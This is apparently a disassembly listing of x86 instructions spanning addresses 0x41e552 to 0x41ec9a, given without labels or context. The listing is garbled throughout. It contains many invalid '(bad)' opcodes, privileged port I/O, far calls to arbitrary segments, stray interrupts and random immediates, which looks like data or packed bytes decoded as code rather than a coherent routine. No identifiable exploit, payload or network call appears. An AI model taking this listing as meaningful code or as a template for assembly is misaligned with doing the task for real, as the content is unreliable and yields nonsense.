  41e552:	shl    BYTE PTR [edx+0x2e],cl
  41e555:	in     eax,dx
  41e556:	jne    0x41e50e
  41e558:	sbb    eax,0x8a6bea3a
  41e55d:	mov    bh,0xca
  41e55f:	mov    eax,0x181abfe2
  41e564:	rcl    DWORD PTR [edx-0x7635a313],0xc9
  41e56b:	dec    esi
  41e56c:	and    DWORD PTR [esi+0x49fd41b],eax
  41e572:	sub    al,0x6
  41e574:	nop
  41e575:	cmp    al,0x6d
  41e577:	mov    eax,ds:0x72fb7e9
  41e57c:	stos   BYTE PTR es:[edi],al
  41e57d:	rcr    ah,0x8
  41e580:	or     ah,0xcc
  41e583:	fwait
  41e584:	jo     0x41e575
  41e586:	push   ebx
  41e587:	xor    al,0xf6
  41e589:	pop    edx
  41e58a:	mov    edx,0xd5ea4093
  41e58f:	pop    ebp
  41e590:	jno    0x41e5c5
  41e592:	sbb    DWORD PTR ds:[ecx+0x4d8d080],0x123a90e
  41e59d:	daa    
  41e59e:	sub    dl,BYTE PTR [esi+0x6c]
  41e5a1:	in     al,0xbf
  41e5a3:	inc    DWORD PTR [ebx-0x1a79821c]
  41e5a9:	sar    BYTE PTR [ecx+0x24181af3],1
  41e5af:	push   ecx
  41e5b0:	xchg   ebx,eax
  41e5b1:	mov    edi,0x69776e43
  41e5b6:	push   edi
  41e5b7:	adc    BYTE PTR [ebx+0x67],dl
  41e5ba:	(bad)  
  41e5bc:	idiv   BYTE PTR [edx-0x2ee9da0b]
  41e5c2:	ror    BYTE PTR [esi],0xee
  41e5c5:	outs   dx,BYTE PTR ds:[esi]
  41e5c6:	in     al,dx
  41e5c7:	(bad)  
  41e5c8:	adc    ebx,DWORD PTR [ecx]
  41e5ca:	(bad)  
  41e5cb:	(bad)  
  41e5cc:	popf   
  41e5cd:	push   esp
  41e5ce:	out    dx,al
  41e5cf:	mov    ah,0x34
  41e5d1:	clc    
  41e5d2:	das    
  41e5d3:	mov    dh,BYTE PTR [edx+0x57]
  41e5d6:	lds    ebx,FWORD PTR [eax+ecx*8+0x6d34780e]
  41e5dd:	retf   
  41e5de:	scas   al,BYTE PTR es:[edi]
  41e5df:	call   0x2f74:0x7f212adc
  41e5e6:	push   cs
  41e5e7:	adc    BYTE PTR [esi+0x1863832],al
  41e5ed:	xchg   ebp,eax
  41e5ee:	stos   BYTE PTR es:[edi],al
  41e5ef:	push   es
  41e5f0:	xor    dh,BYTE PTR ds:0xa75e0b84
  41e5f6:	rcr    BYTE PTR [edi-0x13],cl
  41e5f9:	xor    BYTE PTR [ebx-0x68977ff4],al
  41e5ff:	repnz into 
  41e601:	fld    DWORD PTR [ebp-0x16242ead]
  41e607:	int    0xdf
  41e609:	cmp    al,0xe0
  41e60b:	xor    eax,0x6de74fba
  41e610:	(bad)  
  41e611:	retf   0x646a
  41e614:	ss ja  0x41e5ac
  41e617:	mov    ah,0xc5
  41e619:	popa   
  41e61a:	jo     0x41e5a5
  41e61c:	out    0x5c,al
  41e61e:	nop
  41e61f:	scas   eax,DWORD PTR es:[edi]
  41e620:	pop    esi
  41e621:	inc    ebp
  41e622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e623:	inc    ebp
  41e624:	test   BYTE PTR [ecx+0x21c05f46],0x89
  41e62b:	jp     0x41e5ce
  41e62d:	add    eax,0xeb6f0a14
  41e632:	mov    ch,0x58
  41e635:	loopne 0x41e63a
  41e637:	push   0xe
  41e639:	loope  0x41e634
  41e63b:	adc    dl,BYTE PTR [ebp+0x62]
  41e63e:	add    edi,DWORD PTR [ecx-0x4b2e5317]
  41e644:	push   ss
  41e645:	pop    ecx
  41e646:	in     eax,0xb0
  41e648:	mov    al,0xba
  41e64a:	adc    BYTE PTR [eax],dh
  41e64c:	mov    cl,0xc5
  41e64e:	mov    edi,0x9ae6a5e6
  41e653:	push   ds
  41e654:	in     al,dx
  41e655:	cmp    DWORD PTR [edi+0x607f6506],edx
  41e65b:	inc    edi
  41e65c:	push   0xad524218
  41e661:	retf   0x3308
  41e664:	xchg   edi,eax
  41e665:	not    BYTE PTR [ebp-0x2822b0a7]
  41e66b:	int3   
  41e66c:	xlat   BYTE PTR ds:[ebx]
  41e66d:	aad    0xa1
  41e66f:	jo     0x41e67b
  41e671:	or     BYTE PTR [eax],0x92
  41e674:	adc    bh,BYTE PTR [edx]
  41e676:	cdq    
  41e677:	or     BYTE PTR [ecx-0x4],al
  41e67a:	pop    edx
  41e67b:	gs dec edx
  41e67d:	push   ebp
  41e67e:	retf   
  41e67f:	jne    0x41e6bb
  41e681:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41e683:	cmp    eax,0x7ef472e8
  41e688:	(bad)  
  41e68a:	leave  
  41e68b:	mov    cl,0xbc
  41e68d:	sbb    DWORD PTR [edx],esi
  41e68f:	icebp  
  41e690:	or     al,0x2b
  41e692:	dec    ecx
  41e693:	adc    al,0x54
  41e695:	push   cs
  41e696:	fst    st(1)
  41e698:	or     dl,BYTE PTR [eax]
  41e69a:	cmp    eax,DWORD PTR [eax]
  41e69c:	fdivrp st(5),st
  41e69e:	sub    DWORD PTR [edi+eax*8-0x21],0xda32ddfa
  41e6a6:	addr16 or eax,0xf86599b
  41e6ac:	jl     0x41e634
  41e6ae:	out    0x12,al
  41e6b0:	fistp  DWORD PTR [ebp+ebp*1-0x66]
  41e6b4:	icebp  
  41e6b5:	clc    
  41e6b6:	mov    bh,0x92
  41e6b8:	enter  0x6441,0xbe
  41e6bc:	jns    0x41e6d9
  41e6be:	shr    DWORD PTR [eax+0x72],0xc2
  41e6c2:	mov    edx,0x3a88a522
  41e6c7:	repz das 
  41e6c9:	xchg   esi,eax
  41e6ca:	cmp    BYTE PTR [ebx+0x3ad06d11],cl
  41e6d0:	dec    ebx
  41e6d1:	daa    
  41e6d2:	sbb    DWORD PTR [ebp+0xb],ebx
  41e6d5:	hlt    
  41e6d6:	jbe    0x41e72b
  41e6d8:	stos   BYTE PTR es:[edi],al
  41e6d9:	add    eax,0xd7826584
  41e6de:	xor    eax,0xd8c4d2b8
  41e6e3:	dec    edi
  41e6e4:	stos   DWORD PTR es:[edi],eax
  41e6e5:	aad    0xd5
  41e6e7:	loopne 0x41e70f
  41e6e9:	cmc    
  41e6ea:	lods   eax,DWORD PTR ds:[esi]
  41e6eb:	adc    BYTE PTR [eax-0x26942090],bh
  41e6f1:	or     esi,DWORD PTR [edi+edi*2-0x2b26bbf1]
  41e6f8:	ror    DWORD PTR [ecx],cl
  41e6fa:	int    0x77
  41e6fc:	aad    0x3e
  41e6fe:	fcomp  QWORD PTR [edi+0x73ea4fa8]
  41e704:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e705:	xor    al,0xf7
  41e707:	cmovge eax,esp
  41e70a:	cld    
  41e70b:	jge    0x41e775
  41e70d:	push   ds
  41e70e:	ja     0x41e6cb
  41e710:	sahf   
  41e711:	mov    ah,0x88
  41e713:	xchg   edi,eax
  41e714:	aam    0x45
  41e716:	nop
  41e717:	aad    0x92
  41e719:	xchg   edx,eax
  41e71a:	sub    DWORD PTR [ebx],edx
  41e71c:	aas    
  41e71d:	xchg   edi,eax
  41e71e:	out    dx,eax
  41e71f:	inc    ebx
  41e720:	xchg   edx,eax
  41e721:	int3   
  41e722:	and    eax,0x8fe5a90b
  41e727:	test   DWORD PTR [esi],edx
  41e729:	out    dx,al
  41e72a:	out    0x2e,eax
  41e72c:	inc    eax
  41e72d:	into   
  41e72e:	sub    bl,dl
  41e730:	or     edi,DWORD PTR [ecx-0x2269956a]
  41e736:	jb     0x41e703
  41e738:	(bad)  
  41e739:	xchg   ebp,eax
  41e73a:	push   ds
  41e73b:	ja     0x41e6d4
  41e73d:	pop    ecx
  41e73e:	(bad)  
  41e73f:	pop    ss
  41e740:	adc    eax,0x8b4f7b50
  41e745:	sbb    BYTE PTR [eax+0xbb0f5a6],ch
  41e74b:	mov    eax,ds:0x70ad5719
  41e750:	push   edx
  41e751:	std    
  41e752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e753:	xchg   esp,eax
  41e754:	cdq    
  41e755:	sub    BYTE PTR [esi+0x24aacc8],0x93
  41e75c:	mov    ah,0xf1
  41e75e:	adc    DWORD PTR [esi+0x17cc2bed],ecx
  41e764:	mov    bl,0xc7
  41e766:	sar    DWORD PTR [ebx],cl
  41e768:	xor    DWORD PTR [edx+0x5d],0x6c1f536c
  41e76f:	and    ebp,DWORD PTR [ecx+0x24]
  41e772:	retf   0xa084
  41e775:	mov    bh,0x3e
  41e777:	les    edx,FWORD PTR [ebp+edx*4-0x2b]
  41e77b:	enter  0xf02e,0xde
  41e77f:	push   cs
  41e780:	and    ch,BYTE PTR [ebp+0x77f030f]
  41e786:	mov    ebp,0x641b1d2b
  41e78b:	cwde   
  41e78c:	test   DWORD PTR [ebx-0x5d],ebp
  41e78f:	movlps QWORD PTR [esi],xmm3
  41e792:	int3   
  41e793:	in     al,0x16
  41e795:	(bad)  
  41e796:	sbb    BYTE PTR ds:0xd7935b12,bl
  41e79c:	fsubr  st,st(1)
  41e79e:	and    esi,DWORD PTR [ebx+0x1ea08647]
  41e7a4:	adc    esi,DWORD PTR [eax*8+0x5395e7d2]
  41e7ab:	mov    cl,0x11
  41e7ad:	pushf  
  41e7ae:	inc    edi
  41e7af:	sbb    cl,BYTE PTR ds:0x9f575ef6
  41e7b5:	fld    DWORD PTR [edi]
  41e7b7:	cmc    
  41e7b8:	jmp    0xea806511
  41e7bd:	adc    BYTE PTR [esp+ebx*1-0x210b9f7e],al
  41e7c4:	or     bh,BYTE PTR [edi+0x79f849b4]
  41e7ca:	cld    
  41e7cb:	bound  ebp,QWORD PTR [ebx-0x51]
  41e7ce:	icebp  
  41e7cf:	and    BYTE PTR [edx+0x54d27e43],cl
  41e7d5:	jae    0x41e76d
  41e7d7:	or     DWORD PTR [edi],0xd9de698a
  41e7dd:	adc    DWORD PTR [edi],esi
  41e7df:	es cwde 
  41e7e1:	mov    dl,bl
  41e7e3:	ret    
  41e7e4:	pop    ebp
  41e7e5:	xchg   esi,eax
  41e7e6:	in     eax,0x20
  41e7e8:	lock cwde 
  41e7ea:	push   ds
  41e7eb:	sub    ch,ah
  41e7ed:	loop   0x41e793
  41e7ef:	not    cl
  41e7f1:	or     eax,0x45e7e58d
  41e7f6:	fsubrp st(0),st
  41e7f8:	push   esi
  41e7f9:	imul   ecx,DWORD PTR [edi-0x5236ce5],0xfffffff4
  41e800:	inc    ebx
  41e801:	jg     0x41e84e
  41e803:	out    dx,al
  41e804:	cmp    al,0x3
  41e806:	mov    WORD PTR [esi+0x2b1d8750],?
  41e80c:	rcl    BYTE PTR [eax-0x79],0xdd
  41e810:	or     DWORD PTR [edi-0x2c],edi
  41e813:	fcomp  QWORD PTR [eax+0x4]
  41e816:	aad    0x19
  41e818:	or     eax,0xbb39f7df
  41e81d:	or     DWORD PTR es:0x4bbd05b,esi
  41e824:	add    bh,BYTE PTR [esi]
  41e826:	(bad)  
  41e827:	in     al,dx
  41e828:	push   ecx
  41e829:	jns    0x41e82d
  41e82b:	mov    ecx,0x4c3cff5a
  41e830:	inc    edi
  41e831:	xchg   BYTE PTR [ecx+ebx*2+0x5f],cl
  41e835:	popf   
  41e836:	call   DWORD PTR [esi+0x68636c45]
  41e83c:	sub    DWORD PTR [edi+eiz*4],esp
  41e83f:	adc    eax,0x3a09ea44
  41e844:	iret   
  41e845:	add    DWORD PTR [esi+0x50],edi
  41e848:	lock jecxz 0x41e899
  41e84b:	ds ds pop ebx
  41e84e:	in     eax,0x71
  41e850:	cld    
  41e851:	sar    BYTE PTR [ebx+edi*2],1
  41e854:	jmp    0x3d95a5e9
  41e859:	jae    0x41e866
  41e85b:	xor    bh,BYTE PTR [edx-0x80]
  41e85e:	mov    ds:0x58be588d,eax
  41e863:	js     0x41e888
  41e865:	jg     0x41e831
  41e867:	das    
  41e868:	cmp    eax,0xe49fca62
  41e86d:	js     0x41e864
  41e86f:	jmp    0x41e840
  41e871:	or     al,0x5d
  41e873:	sub    ecx,esi
  41e875:	je     0x41e7fa
  41e877:	fdivr  QWORD PTR es:0x66d0d974
  41e87e:	xor    ebp,DWORD PTR [ebx]
  41e880:	jns    0x41e868
  41e882:	dec    eax
  41e883:	cmp    al,0x45
  41e885:	and    BYTE PTR [esi+0x3f],ch
  41e888:	jecxz  0x41e86a
  41e88a:	dec    edi
  41e88b:	fsub   QWORD PTR [edx]
  41e88d:	mov    eax,ds:0x29865ca2
  41e892:	dec    ebp
  41e893:	in     al,0xed
  41e895:	sbb    eax,0x928bae66
  41e89a:	shr    cl,cl
  41e89c:	ins    BYTE PTR es:[edi],dx
  41e89d:	cmp    al,0xb0
  41e89f:	loop   0x41e845
  41e8a1:	cmp    eax,edi
  41e8a3:	push   esi
  41e8a4:	sub    DWORD PTR gs:[eax],esi
  41e8a7:	out    0x2e,al
  41e8a9:	retf   
  41e8aa:	loope  0x41e861
  41e8ac:	aas    
  41e8ad:	fcomp  QWORD PTR [ebx*4-0x4270468c]
  41e8b4:	or     BYTE PTR [ebp+0x11950396],ah
  41e8ba:	push   ss
  41e8bb:	pop    ebp
  41e8bc:	sar    esi,1
  41e8be:	pop    ecx
  41e8bf:	sbb    bl,BYTE PTR [eax+0x20]
  41e8c2:	pusha  
  41e8c3:	push   esp
  41e8c4:	int    0xc4
  41e8c6:	imul   esp,DWORD PTR [ebx],0x4a
  41e8c9:	adc    al,0x45
  41e8cb:	popa   
  41e8cc:	mov    bh,0xa2
  41e8ce:	test   DWORD PTR [ebx],0x409388e4
  41e8d4:	pop    edx
  41e8d5:	mov    al,ds:0x809827b3
  41e8da:	adc    BYTE PTR [ebp+0x57fe5039],ah
  41e8e0:	test   al,0xb2
  41e8e2:	sub    dh,BYTE PTR [ecx-0x7]
  41e8e5:	push   edi
  41e8e6:	lds    ecx,FWORD PTR [ebx]
  41e8e8:	loope  0x41e917
  41e8ea:	or     BYTE PTR [esi],bh
  41e8ec:	inc    ebx
  41e8ed:	in     eax,0x62
  41e8ef:	mov    ah,0x43
  41e8f1:	mov    ds:0x6fbec2ca,eax
  41e8f6:	cmp    DWORD PTR [ecx],esp
  41e8f8:	dec    edx
  41e8f9:	xor    DWORD PTR [edi],ebx
  41e8fb:	gs sbb al,0xa8
  41e8fe:	enter  0xf60c,0xad
  41e902:	dec    edi
  41e903:	jmp    0x1e352991
  41e908:	cwde   
  41e909:	xor    ch,BYTE PTR [eax]
  41e90b:	xor    eax,DWORD PTR ds:0xfdcc1abf
  41e911:	rcr    BYTE PTR [eax+ecx*4],cl
  41e914:	add    BYTE PTR [edx+ebp*1+0x21ad8842],bl
  41e91b:	and    al,0xc6
  41e91d:	cmp    DWORD PTR [esp+ebp*8-0x2607d44b],ebp
  41e924:	mov    ebp,0x747ce952
  41e929:	loopne 0x41e9a3
  41e92b:	leave  
  41e92c:	fs call 0xe0e4ae93
  41e932:	shl    dh,0xc7
  41e935:	pop    ebx
  41e936:	stos   BYTE PTR es:[edi],al
  41e937:	es pushf 
  41e939:	leave  
  41e93a:	dec    ebp
  41e93b:	sub    al,0xb6
  41e93d:	pop    ebp
  41e93e:	inc    ecx
  41e93f:	push   cs
  41e940:	or     al,0xdd
  41e942:	dec    eax
  41e943:	dec    eax
  41e944:	test   eax,0x308b981c
  41e949:	xor    dh,BYTE PTR [edi]
  41e94b:	inc    ebx
  41e94c:	pop    ss
  41e94d:	jle    0x41e977
  41e94f:	mov    ecx,0xa438d62b
  41e954:	jne    0x41e990
  41e956:	add    eax,0x4938911a
  41e95b:	lahf   
  41e95c:	ret    0x571e
  41e95f:	in     al,0x7
  41e961:	and    BYTE PTR [eax-0x80],bl
  41e964:	push   es
  41e965:	retf   
  41e966:	clc    
  41e967:	in     al,0xa3
  41e969:	imul   DWORD PTR [edi]
  41e96b:	pop    edx
  41e96c:	loopne 0x41e8fe
  41e96e:	fwait
  41e96f:	shl    DWORD PTR [edi],cl
  41e971:	aam    0xf1
  41e973:	stos   DWORD PTR es:[edi],eax
  41e974:	xchg   edx,eax
  41e975:	sbb    cl,BYTE PTR [ecx+esi*2+0x2086591c]
  41e97c:	jo     0x41e9d0
  41e97e:	pop    edx
  41e97f:	jecxz  0x41e9df
  41e981:	imul   ebp,eax,0xf301160a
  41e987:	stos   BYTE PTR es:[edi],al
  41e988:	adc    eax,DWORD PTR [esi]
  41e98a:	push   eax
  41e98b:	addr16 xchg dh,ah
  41e98e:	ins    BYTE PTR es:[edi],dx
  41e98f:	dec    ecx
  41e990:	fsubr  DWORD PTR [edx+0x69ad5b57]
  41e996:	icebp  
  41e997:	mov    edi,0xc840bd4c
  41e99c:	mov    eax,0x38c95aca
  41e9a1:	jmp    0x41e961
  41e9a3:	add    al,0x3c
  41e9a5:	(bad)  
  41e9a8:	in     al,dx
  41e9a9:	cmp    ebx,esi
  41e9ab:	jnp    0x41e98a
  41e9ad:	mov    ebp,DWORD PTR [edi+0x55]
  41e9b0:	sbb    al,0x89
  41e9b2:	mov    cl,0x60
  41e9b4:	pop    ebp
  41e9b5:	push   edx
  41e9b6:	inc    edi
  41e9b7:	or     esp,edi
  41e9b9:	or     esp,ebx
  41e9bb:	imul   ebp,DWORD PTR [ebx-0x4c58b357],0x6e
  41e9c2:	mov    esp,0x81fe0fbd
  41e9c7:	popf   
  41e9c8:	lods   al,BYTE PTR ds:[esi]
  41e9c9:	and    BYTE PTR [ebx],bl
  41e9cb:	sub    al,dh
  41e9cd:	mov    DWORD PTR [edx+edi*4-0x36006fd2],esi
  41e9d4:	fs push ecx
  41e9d6:	lods   al,BYTE PTR ds:[esi]
  41e9d7:	cld    
  41e9d8:	cmp    esi,DWORD PTR [ebx]
  41e9da:	into   
  41e9db:	add    ebx,DWORD PTR [edi-0x60]
  41e9de:	dec    ebp
  41e9df:	inc    edi
  41e9e0:	adc    ecx,0x53ea2269
  41e9e6:	fsub   QWORD PTR [esi-0x53]
  41e9e9:	dec    ebx
  41e9ea:	pop    esi
  41e9eb:	mov    eax,0xc7f0911c
  41e9f0:	xchg   esi,eax
  41e9f1:	sub    cl,dl
  41e9f3:	test   DWORD PTR [esi+0x20],0x44e32500
  41e9fa:	imul   ebx,edx,0x35
  41e9fd:	xor    edi,DWORD PTR [esi-0x75]
  41ea00:	or     bl,BYTE PTR [ebx-0x4b]
  41ea03:	int3   
  41ea04:	and    al,0xf6
  41ea06:	repz fidivr DWORD PTR [edi]
  41ea09:	xor    DWORD PTR [esi-0x4c],ecx
  41ea0c:	stos   DWORD PTR es:[edi],eax
  41ea0d:	cld    
  41ea0e:	or     ebx,DWORD PTR [ebp-0x1cef7acb]
  41ea14:	xor    DWORD PTR [eax+0x4b],esp
  41ea17:	push   ss
  41ea18:	scas   al,BYTE PTR es:[edi]
  41ea19:	xlat   BYTE PTR ds:[ebx]
  41ea1a:	xchg   esi,eax
  41ea1b:	repnz repnz mov fs,ebx
  41ea1f:	push   eax
  41ea20:	and    eax,DWORD PTR [eax+0x3ddeabbb]
  41ea26:	retf   0x140b
  41ea29:	pop    ss
  41ea2a:	xor    dl,ch
  41ea2c:	scas   eax,DWORD PTR es:[edi]
  41ea2d:	mov    ebx,0x6f857c9a
  41ea32:	(bad)  
  41ea33:	adc    al,0xbf
  41ea35:	xchg   BYTE PTR [eax+0x47],bh
  41ea38:	int3   
  41ea39:	test   DWORD PTR [edx+0x13],ebx
  41ea3c:	ins    BYTE PTR es:[edi],dx
  41ea3d:	ret    
  41ea3e:	pop    ebp
  41ea3f:	adc    al,0xd5
  41ea41:	mov    bl,0x5b
  41ea43:	add    esi,ebp
  41ea45:	sbb    BYTE PTR [edx+esi*1],dh
  41ea48:	mov    eax,0x7fe637f9
  41ea4d:	xor    bh,ah
  41ea4f:	inc    ebp
  41ea50:	and    dh,al
  41ea52:	mov    ds:0xe90d218b,eax
  41ea57:	adc    al,BYTE PTR [edi+0x1a]
  41ea5a:	push   es
  41ea5b:	in     eax,0x77
  41ea5d:	inc    ebx
  41ea5e:	add    DWORD PTR [ebp+0x7d],edx
  41ea61:	aam    0x61
  41ea63:	inc    edx
  41ea64:	sub    BYTE PTR [esi+0x3f],al
  41ea67:	fdivr  DWORD PTR [esi+0x62]
  41ea6a:	adc    cl,BYTE PTR [edx]
  41ea6c:	xchg   edx,eax
  41ea6d:	or     BYTE PTR [ecx],dh
  41ea6f:	push   esp
  41ea70:	retf   
  41ea71:	ret    0x79b9
  41ea74:	adc    eax,0x7245e88e
  41ea79:	jno    0x41ea9e
  41ea7b:	mov    ah,0x36
  41ea7d:	mov    dl,0x5c
  41ea7f:	call   0x8db7c61c
  41ea84:	iret   
  41ea85:	push   eax
  41ea86:	push   eax
  41ea87:	or     dl,0x19
  41ea8a:	in     al,0xd1
  41ea8c:	or     edi,DWORD PTR [edx-0x10]
  41ea8f:	sub    DWORD PTR [edx-0xf],edi
  41ea92:	ja     0x41ea9a
  41ea94:	add    ecx,DWORD PTR [ebp-0x1c]
  41ea97:	out    0x4f,al
  41ea99:	jge    0x41ea24
  41ea9b:	fld    DWORD PTR [eax+eax*4]
  41ea9e:	mov    BYTE PTR [eax-0x74],bh
  41eaa1:	fild   WORD PTR [ebx]
  41eaa3:	jl     0x41ea3f
  41eaa5:	loope  0x41ea36
  41eaa7:	mov    al,ds:0x44884d3c
  41eaac:	sti    
  41eaad:	mov    cl,0x8a
  41eaaf:	stos   DWORD PTR es:[edi],eax
  41eab0:	mov    esi,0xac934a57
  41eab5:	in     al,0x73
  41eab7:	test   edi,esi
  41eab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaba:	push   cs
  41eabb:	pop    edx
  41eabc:	pop    esi
  41eabd:	sbb    al,0xec
  41eabf:	dec    ebx
  41eac0:	int3   
  41eac1:	cs push cs
  41eac3:	test   DWORD PTR [eax-0x7ef99d45],ecx
  41eac9:	mov    bl,0x8
  41eacb:	mov    ecx,0xa55bdd37
  41ead0:	cwde   
  41ead1:	sbb    cl,BYTE PTR [bp-0x3b]
  41ead5:	(bad)  
  41ead6:	rep ins BYTE PTR es:[edi],dx
  41ead8:	fs push cs
  41eada:	sbb    ecx,DWORD PTR [esi]
  41eadc:	lock jb 0x41eb37
  41eadf:	(bad)  
  41eae0:	and    al,0x4d
  41eae2:	outs   dx,DWORD PTR ds:[esi]
  41eae3:	test   BYTE PTR [ebp-0x6ff8186b],bl
  41eae9:	inc    ebx
  41eaea:	adc    DWORD PTR [eax],ebx
  41eaec:	jecxz  0x41eadc
  41eaee:	or     ecx,DWORD PTR [ecx+0x2bcec381]
  41eaf4:	enter  0xd69d,0x81
  41eaf8:	cmp    DWORD PTR [ebx-0x9bdf0cb],edx
  41eafe:	push   0x6a728b4c
  41eb03:	mov    eax,ds:0xd597d3ee
  41eb08:	stos   DWORD PTR es:[edi],eax
  41eb09:	test   BYTE PTR [ebx+0x74],al
  41eb0c:	xchg   ecx,eax
  41eb0d:	(bad)  
  41eb0e:	shl    BYTE PTR [ebx+0x335da795],1
  41eb14:	jnp    0x41eac5
  41eb16:	or     bl,dl
  41eb18:	mov    ebp,0xed11bdf3
  41eb1d:	adc    ebx,DWORD PTR [eax+0x21e0d480]
  41eb23:	out    dx,al
  41eb24:	inc    esi
  41eb25:	test   eax,0xeaadf2e8
  41eb2a:	mov    ds:0x9c92e463,al
  41eb2f:	jo     0x41eb8b
  41eb31:	xchg   esi,eax
  41eb32:	pop    edx
  41eb33:	lods   eax,DWORD PTR ds:[esi]
  41eb34:	mov    ebx,0xe28fd071
  41eb39:	ins    DWORD PTR es:[edi],dx
  41eb3a:	inc    ecx
  41eb3b:	sahf   
  41eb3c:	push   esi
  41eb3d:	cwde   
  41eb3e:	das    
  41eb3f:	xchg   esi,ebp
  41eb41:	pop    ss
  41eb42:	jnp    0x41eb22
  41eb44:	fcom   QWORD PTR [eax-0x18ad2575]
  41eb4a:	nop
  41eb4b:	pop    ds
  41eb4c:	outs   dx,BYTE PTR ds:[esi]
  41eb4d:	jmp    0x41eb66
  41eb4f:	cmp    al,0x1e
  41eb51:	cli    
  41eb52:	sub    ecx,ebx
  41eb54:	fsubr  DWORD PTR [edx+0x4e]
  41eb57:	(bad)  
  41eb58:	popf   
  41eb59:	push   edx
  41eb5a:	pusha  
  41eb5b:	cmp    cl,BYTE PTR [eax]
  41eb5d:	jle    0x41ebd6
  41eb5f:	dec    esi
  41eb60:	push   0xb8debb8d
  41eb65:	adc    DWORD PTR [ecx+0xb],edi
  41eb68:	(bad)  
  41eb69:	out    0x6f,al
  41eb6b:	stos   DWORD PTR es:[edi],eax
  41eb6c:	mov    bl,0x50
  41eb6e:	ficom  DWORD PTR [ebx]
  41eb70:	retf   
  41eb71:	fwait
  41eb72:	lahf   
  41eb73:	neg    DWORD PTR [edi+0x11]
  41eb76:	pusha  
  41eb77:	sbb    ah,bl
  41eb79:	add    eax,0x63eba368
  41eb7e:	aad    0x72
  41eb80:	add    al,0xbe
  41eb82:	push   edi
  41eb83:	push   edx
  41eb84:	add    dh,BYTE PTR [esi]
  41eb86:	loope  0x41eb56
  41eb88:	fst    DWORD PTR [eax+0x11]
  41eb8b:	adc    ecx,DWORD PTR [ecx+ebp*8+0x206b5c88]
  41eb92:	sub    al,0xb7
  41eb94:	imul   edi,edx,0xffffff83
  41eb97:	cli    
  41eb98:	sub    al,0x3b
  41eb9a:	scas   eax,DWORD PTR es:[edi]
  41eb9b:	out    0xb4,al
  41eb9d:	pushf  
  41eb9e:	inc    ebx
  41eb9f:	or     ebp,ecx
  41eba1:	(bad)  
  41eba2:	out    0xc2,eax
  41eba4:	cmp    DWORD PTR [esi-0x4b],edx
  41eba7:	mov    ah,0x9
  41eba9:	pusha  
  41ebaa:	mov    dl,ah
  41ebac:	(bad)  
  41ebae:	pop    esp
  41ebaf:	cwde   
  41ebb0:	jo     0x41eb3d
  41ebb2:	ficomp WORD PTR [edx-0x713bcfec]
  41ebb8:	in     al,dx
  41ebb9:	push   ebx
  41ebba:	and    ah,BYTE PTR [ebp+eax*4+0x39]
  41ebbe:	cmp    al,0x68
  41ebc0:	pop    ebx
  41ebc1:	(bad)  
  41ebc2:	mov    ebp,ecx
  41ebc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebc5:	and    edi,edx
  41ebc7:	int    0x4b
  41ebc9:	push   edi
  41ebca:	lock jbe 0x41eb94
  41ebcd:	or     cl,bh
  41ebcf:	ins    DWORD PTR es:[edi],dx
  41ebd0:	lock cmp al,0x53
  41ebd3:	mov    DWORD PTR [edi-0x2ae41537],eax
  41ebd9:	mov    ch,0xf7
  41ebdb:	hlt    
  41ebdc:	lock jecxz 0x41ebf7
  41ebdf:	std    
  41ebe0:	dec    edx
  41ebe1:	ins    DWORD PTR es:[edi],dx
  41ebe2:	call   0xd857:0x2bd2ed81
  41ebe9:	pop    ecx
  41ebea:	call   0x35cd7bea
  41ebef:	mov    al,0xea
  41ebf1:	cmc    
  41ebf2:	or     dl,BYTE PTR [eax]
  41ebf4:	loope  0x41ec16
  41ebf6:	loop   0x41ec50
  41ebf8:	retf   
  41ebf9:	in     al,dx
  41ebfa:	imul   esi,DWORD PTR [ebx-0x5a],0xdc4f37b5
  41ec01:	mov    fs,ebx
  41ec03:	pop    edx
  41ec04:	push   ebp
  41ec05:	inc    eax
  41ec06:	lods   al,BYTE PTR ds:[esi]
  41ec07:	iret   
  41ec08:	sbb    DWORD PTR [edx+eax*4-0x52],eax
  41ec0c:	or     DWORD PTR [ecx],eax
  41ec0e:	aad    0xf
  41ec10:	maxps  xmm2,XMMWORD PTR [edi-0x1d]
  41ec14:	or     eax,0x5762caf2
  41ec19:	xor    DWORD PTR [ebx],ebx
  41ec1b:	dec    esp
  41ec1c:	in     al,0x10
  41ec1e:	in     eax,0xc7
  41ec20:	iret   
  41ec21:	jmp    0xefb84a1e
  41ec26:	mov    cl,0x17
  41ec28:	xchg   esi,eax
  41ec29:	jmp    0x41ec24
  41ec2b:	shl    DWORD PTR [edi+0x3c],cl
  41ec2e:	cmp    eax,0x6f44cabe
  41ec33:	sub    ebp,DWORD PTR [ebx-0x68cf695a]
  41ec39:	stos   BYTE PTR es:[edi],al
  41ec3a:	mov    ebp,0x5fd7e2d5
  41ec3f:	or     al,0x92
  41ec41:	mov    DWORD PTR [esi-0x23a6a761],eax
  41ec47:	sbb    ah,BYTE PTR [edx]
  41ec49:	jle    0x41ec72
  41ec4b:	mov    bl,0xed
  41ec4d:	enter  0x2b4a,0x13
  41ec51:	es in  al,dx
  41ec53:	test   DWORD PTR [eax],0x292ea644
  41ec59:	inc    ebx
  41ec5a:	(bad)  [ebx-0x76]
  41ec5d:	mov    edx,0x527c25c0
  41ec62:	nop
  41ec63:	dec    ecx
  41ec64:	daa    
  41ec65:	ret    0xd1c6
  41ec68:	xlat   BYTE PTR ds:[ebx]
  41ec69:	sbb    al,0xb8
  41ec6b:	out    dx,eax
  41ec6c:	inc    esp
  41ec6d:	push   eax
  41ec6e:	fs pop edx
  41ec70:	ror    ah,1
  41ec72:	adc    BYTE PTR [ebx],0xaa
  41ec75:	outs   dx,BYTE PTR ds:[esi]
  41ec76:	mov    gs,WORD PTR [ecx-0x1371dfaa]
  41ec7c:	out    dx,al
  41ec7d:	adc    al,0xd8
  41ec7f:	je     0x41ecd5
  41ec81:	ss add eax,0xef0defff
  41ec87:	xchg   edi,eax
  41ec88:	fwait
  41ec89:	or     dl,al
  41ec8b:	pop    ds
  41ec8c:	dec    ebx
  41ec8d:	cmp    DWORD PTR [eax+ebx*4],edx
  41ec90:	ss je  0x41ed0a
  41ec93:	cdq    
  41ec94:	ficom  WORD PTR [edi-0x1acfff82]
  41ec9a:	in     eax,0x47
